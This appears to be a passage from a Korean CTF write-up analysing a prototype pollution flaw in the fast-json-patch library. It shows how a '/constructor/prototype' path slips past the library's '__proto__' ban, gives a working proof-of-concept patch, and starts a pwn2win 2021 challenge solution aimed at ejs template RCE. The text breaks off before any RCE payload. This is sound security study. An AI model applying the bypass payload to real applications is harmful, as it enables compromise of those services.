class="keyword">var</span> t = <span class="number">1</span>; <span class="comment">//skip empty element - http://jsperf.com/to-shift-or-not-to-shift</span></span><br><span class="line">        <span class="keyword">var</span> len = keys.length;</span><br><span class="line">        <span class="keyword">var</span> existingPathFragment = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> validateFunction = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> validateOperation == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            validateFunction = validateOperation;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            validateFunction = validator;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            key = keys[t];</span><br><span class="line">            <span class="keyword">if</span> (banPrototypeModifications &amp;&amp; key == <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (validateOperation) &#123;</span><br><span class="line">                <span class="keyword">if</span> (existingPathFragment === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (obj[key] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">                        existingPathFragment = keys.slice(<span class="number">0</span>, t).join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (t == len - <span class="number">1</span>) &#123;</span><br><span class="line">                        existingPathFragment = operation.path;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (existingPathFragment !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                        validateFunction(operation, <span class="number">0</span>, <span class="built_in">document</span>, existingPathFragment);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            t++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(obj)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (key === <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                    key = obj.length;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (validateOperation &amp;&amp; !helpers_js_1.isInteger(key)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&quot;Expected an unsigned base-10 integer value, making the new referenced value the array element with the zero-based index&quot;</span>, <span class="string">&quot;OPERATION_PATH_ILLEGAL_ARRAY_INDEX&quot;</span>, index, operation, <span class="built_in">document</span>);</span><br><span class="line">                    &#125; <span class="comment">// only parse key when it&#x27;s an integer for `arr.prop` to work</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (helpers_js_1.isInteger(key)) &#123;</span><br><span class="line">                        key = ~~key;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (t &gt;= len) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (validateOperation &amp;&amp; operation.op === <span class="string">&quot;add&quot;</span> &amp;&amp; key &gt; obj.length) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&quot;The specified index MUST NOT be greater than the number of elements in the array&quot;</span>, <span class="string">&quot;OPERATION_VALUE_OUT_OF_BOUNDS&quot;</span>, index, operation, <span class="built_in">document</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">var</span> returnValue = arrOps[operation.op].call(operation, obj, key, <span class="built_in">document</span>); <span class="comment">// Apply patch</span></span><br><span class="line">                    <span class="keyword">if</span> (returnValue.test === <span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&quot;Test operation failed&quot;</span>, <span class="string">&#x27;TEST_OPERATION_FAILED&#x27;</span>, index, operation, <span class="built_in">document</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> returnValue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (key &amp;&amp; key.indexOf(<span class="string">&#x27;~&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    key = helpers_js_1.unescapePathComponent(key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (t &gt;= len) &#123;</span><br><span class="line">                    <span class="keyword">var</span> returnValue = objOps[operation.op].call(operation, obj, key, <span class="built_in">document</span>); <span class="comment">// Apply patch</span></span><br><span class="line">                    <span class="keyword">if</span> (returnValue.test === <span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&quot;Test operation failed&quot;</span>, <span class="string">&#x27;TEST_OPERATION_FAILED&#x27;</span>, index, operation, <span class="built_in">document</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> returnValue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            obj = obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>applyOperation()</code> 메서드를 보면 중간에 슬래쉬를 이용해서 <code>path</code> 값을 스플릿하는 것을 볼 수 있다. 우리는 path의 값으로 <code>&quot;/constructor/prototype/polluted&quot;</code>와 같이 주었기 때문에 keys의 값은 <code>[&#39;constructor&#39;, &#39;prototype&#39;, &#39;polluted&#39;]</code>가 된다.</p><p>이렇게 값을 스플릿 해준 후에 keys.length만큼 와일문을 돌린다. 이때 <code>keys</code> 값으로 <code>__proto__</code>가 들어오면 <code>JSON-Patch: modifying &#39;__proto__&#39; prop is banned for security reasons, if this was on purpose, please set &#39;banPrototypeModifications&#39; flag false and pass it to this function. More info in fast-json-patch READM</code>와 같은 구문을 출력하고 끝내는 것을 볼 수 있다. 아마도 <code>Prototype Pollution</code>을 방지한 것 같다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/%5B1.png?raw=true"></p><p>하지만 <code>__proto__</code> 프로퍼티와 <code>constructor.prototype</code> 프로퍼티는 동일하기 때문에 이를 이용해서 <code>Prototype Pollution</code> 공격을 할 수 있다.</p><p>와일문을 돌면서 if 문을 이용해서 조건에 맞는 오퍼레이션을 하는 것으로 보인다.</p><ul><li>첫 번째 조건은 일단 key의 값으로 <code>__proto__</code>가 존재하지 않아야 한다.</li><li>두 번째 조건은 <code>validateOperation</code>의 값이 참이어야 한다.</li><li>세 번째 조건은 우리가 전달해준 패치가 될 주체가 <code>Array</code>여야 한다.</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key &amp;&amp; key.indexOf(<span class="string">&#x27;~&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        key = helpers_js_1.unescapePathComponent(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (t &gt;= len) &#123;</span><br><span class="line">        <span class="keyword">var</span> returnValue = objOps[operation.op].call(operation, obj, key, <span class="built_in">document</span>); <span class="comment">// Apply patch</span></span><br><span class="line">        <span class="keyword">if</span> (returnValue.test === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">exports</span>.JsonPatchError(<span class="string">&quot;Test operation failed&quot;</span>, <span class="string">&#x27;TEST_OPERATION_FAILED&#x27;</span>, index, operation, <span class="built_in">document</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 세 가지지 조건을 모두 위배할 경우에는 위 코드가 실행이 된다. 일단 우리는 <code>patch</code>의 값으로 <code>~</code>가 들어간 곳이 없기 때문에 3번 모두 else문이 실행이 될 것 이다. else 문을 보면 <code>objOps</code>를 이용해서 패치를 하는 것을 볼 수 있고, 인자로는 연산자, 패치 될 주체, 패치할 값, 패치 될 주체를 넘겨주고 있는 것을 볼 수 있다. 여기서 우리는 연산자를 넘겨줄 때, <code>replace</code>를 넘겨주었다.</p><hr><h2 id="Analysis-objOps"><a href="#Analysis-objOps" class="headerlink" title="Analysis : objOps"></a>Analysis : objOps</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objOps = &#123;</span><br><span class="line">    add: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        obj[key] = <span class="built_in">this</span>.value;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span> &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    remove: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> removed = obj[key];</span><br><span class="line">        <span class="keyword">delete</span> obj[key];</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span>, <span class="attr">removed</span>: removed &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    replace: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> removed = obj[key];</span><br><span class="line">        obj[key] = <span class="built_in">this</span>.value;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span>, <span class="attr">removed</span>: removed &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    move: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* in case move target overwrites an existing value,</span></span><br><span class="line"><span class="comment">        return the removed value, this can be taxing performance-wise,</span></span><br><span class="line"><span class="comment">        and is potentially unneeded */</span></span><br><span class="line">        <span class="keyword">var</span> removed = getValueByPointer(<span class="built_in">document</span>, <span class="built_in">this</span>.path);</span><br><span class="line">        <span class="keyword">if</span> (removed) &#123;</span><br><span class="line">            removed = helpers_js_1._deepClone(removed);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> originalValue = applyOperation(<span class="built_in">document</span>, &#123; <span class="attr">op</span>: <span class="string">&quot;remove&quot;</span>, <span class="attr">path</span>: <span class="built_in">this</span>.from &#125;).removed;</span><br><span class="line">        applyOperation(<span class="built_in">document</span>, &#123; <span class="attr">op</span>: <span class="string">&quot;add&quot;</span>, <span class="attr">path</span>: <span class="built_in">this</span>.path, <span class="attr">value</span>: originalValue &#125;);</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span>, <span class="attr">removed</span>: removed &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    copy: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> valueToCopy = getValueByPointer(<span class="built_in">document</span>, <span class="built_in">this</span>.from);</span><br><span class="line">        <span class="comment">// enforce copy by value so further operations don&#x27;t affect source (see issue #177)</span></span><br><span class="line">        applyOperation(<span class="built_in">document</span>, &#123; <span class="attr">op</span>: <span class="string">&quot;add&quot;</span>, <span class="attr">path</span>: <span class="built_in">this</span>.path, <span class="attr">value</span>: helpers_js_1._deepClone(valueToCopy) &#125;);</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span> &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    test: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span>, <span class="attr">test</span>: _areEquals(obj[key], <span class="built_in">this</span>.value) &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">    _get: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.value = obj[key];</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>objOps</code>를 보면 내부에 여러 함수들이 정의되어 있는 것을 볼 수 있다. <code>키:값</code>을 추가, 삭제, 리플레이스, 이동, 복사 등 등을 할 수 있는 것으로 보이고, 무엇을 실행할 지는 <code>objOps</code>에 인자로 넘어온 값을  통해서 판단하고 있다.</p><p>우리는 연산자로 <code>replace</code>를 보냈다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">replace: <span class="function"><span class="keyword">function</span> (<span class="params">obj, key, <span class="built_in">document</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> removed = obj[key];</span><br><span class="line">    obj[key] = <span class="built_in">this</span>.value;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">newDocument</span>: <span class="built_in">document</span>, <span class="attr">removed</span>: removed &#125;;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>replace()</code> 메서드를 확인해보면 key의 값을 <code>value</code>를 넣어주고 있는 것을 볼 수 있고, 바로 여기서 <code>Prototype Pollution</code> 취약점이 발생한다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> patch = [&#123;<span class="attr">op</span>: <span class="string">&quot;replace&quot;</span>, <span class="attr">path</span>: <span class="string">&quot;/constructor/prototype/polluted&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;Prototype Pollution&quot;</span>&#125;];</span><br><span class="line">fastjsonpatch.applyPatch(a, patch);</span><br></pre></td></tr></table></figure><p>우리는 위처럼 <code>path</code> 값을 전송을 했다. 그러니 내부 오퍼레이션에 의해서 와일문을 돌고, 제일 마지막 번째에서는 마치 <code>a[&#39;constructor&#39;][&#39;prototype&#39;][&#39;polluted&#39;]</code>와 같이 작동을 하게 되어 <code>Prototype Pollution</code>이 발생한다.</p><hr><h2 id="Exploit-Web-pwn2win-CTF-2021-152-pts"><a href="#Exploit-Web-pwn2win-CTF-2021-152-pts" class="headerlink" title="Exploit (Web) pwn2win CTF 2021 [152 pts]"></a>Exploit (Web) pwn2win CTF 2021 [152 pts]</h2><p>이번 주말에는 <code>pwn2win CTF 2021</code>이라는 대회가 열렸는데 해당 대회에서 웹 문제 중에 솔브가 제일 많은 문제가 <code>Prototype Pollution to RCE in ejs</code>를 이용한 문제였다. 하지만 삽질 실수를 해서 <code>Prototype Pollution</code> 공격을 하지 못 했고, 대회가 끝나고 롸업을 본 후에 <code>npm</code> 공식 사이트를 보니 거의 중간에 답이 있어서 매우 아쉬운 문제다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FROM node:alpine</span><br><span class="line"></span><br><span class="line">EXPOSE 1337</span><br><span class="line"></span><br><span class="line"># copy flag</span><br><span class="line">COPY flag.txt &#x2F;root&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line"># copy readflag binary (it just reads the flag)</span><br><span class="line">COPY readflag &#x2F;</span><br><span class="line">RUN chmod 4755 &#x2F;readflag</span><br><span class="line"></span><br><span class="line"># install web application</span><br><span class="line">COPY src &#x2F;app</span><br><span class="line">RUN cd &#x2F;app &amp;&amp; npm install</span><br><span class="line"></span><br><span class="line"># change to guest user</span><br><span class="line">USER 405</span><br><span class="line"></span><br><span class="line"># run application and stay alive for 5 minutes</span><br><span class="line">COPY entrypoint.sh &#x2F; </span><br><span class="line">ENTRYPOINT &#x2F;entrypoint.sh</span><br></pre></td></tr></table></figure><p>도커 파일을 확인해보면 <code>/readflag</code>라는 바이너리 파일을 실행 시키면 될 거 같다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jsonpatch = <span class="built_in">require</span>(<span class="string">&#x27;fast-json-patch&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> basicAuth = <span class="built_in">require</span>(<span class="string">&#x27;express-basic-auth&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middlewares //</span></span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(basicAuth(&#123;</span><br><span class="line">    users: &#123; <span class="string">&quot;admin&quot;</span>: process.env.SECRET || <span class="string">&quot;admin&quot;</span> &#125;,</span><br><span class="line">    challenge: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> services = &#123;</span><br><span class="line">    status: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    cameras: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    doors: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    dome: <span class="string">&quot;online&quot;</span>,</span><br><span class="line">    turrets: <span class="string">&quot;online&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Static folder</span></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/templates/index.ejs&quot;</span>, &#123;services&#125;)</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure><p>서버 측 코드를 확인해보면 <code>/change_status</code>에서 json으로 값을 받아와서 patch 배열에 입력값을 푸쉬한 후에 <code>applyPatch()</code> 메서드에 인자로 넘겨주는 것을 볼 수 있다. 이 뒤로는 위 분석을 통해 충분히 확인하였으니 따로 부연 설명은 생략.</p><p>그럼 <code>Prototype Pollution</code>은 성공했지만 RCE를 어떻게 발생시켜야 할 지 확인 해야한다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/templates/index.ejs&quot;</span>, &#123;services&#125;)</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>index를 보면 ejs의 <code>renderFile()</code> 메서드를 이용해서 템플릿을 반환하는 것을 볼 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do we have a callback?</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>[<span class="built_in">arguments</span>.length - <span class="number">1</span>] == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    cb = args.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Do we have data/opts?</span></span><br><span class="line">  <span class="keyword">if</span> (args.length) &#123;</span><br><span class="line">    <span class="comment">// Should always have data obj</span></span><br><span class="line">    data = args.shift();</span><br><span class="line">    <span class="comment">// Normal passed opts (data obj + opts obj)</span></span><br><span class="line">    <span class="keyword">if</span> (args.length) &#123;</span><br><span class="line">      <span class="comment">// Use shallowCopy so we don&#x27;t pollute passed in opts obj with new vals</span></span><br><span class="line">      utils.shallowCopy(opts, args.pop());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Special casing for Express (settings + opts-in-data)</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Express 3 and 4</span></span><br><span class="line">      <span class="keyword">if</span> (data.settings) &#123;</span><br><span class="line">        <span class="comment">// Pull a few things from known locations</span></span><br><span class="line">        <span class="keyword">if</span> (data.settings.views) &#123;</span><br><span class="line">          opts.views = data.settings.views;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.settings[<span class="string">&#x27;view cache&#x27;</span>]) &#123;</span><br><span class="line">          opts.cache = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line">        <span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">        viewOpts = data.settings[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">          utils.shallowCopy(opts, viewOpts);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Express 2 and lower, values set in app.locals, or people who just</span></span><br><span class="line">      <span class="comment">// want to pass options in their data. <span class="doctag">NOTE:</span> These values will override</span></span><br><span class="line">      <span class="comment">// anything previously set in settings  or settings[&#x27;view options&#x27;]</span></span><br><span class="line">      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);</span><br><span class="line">    &#125;</span><br><span class="line">    opts.filename = filename;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> 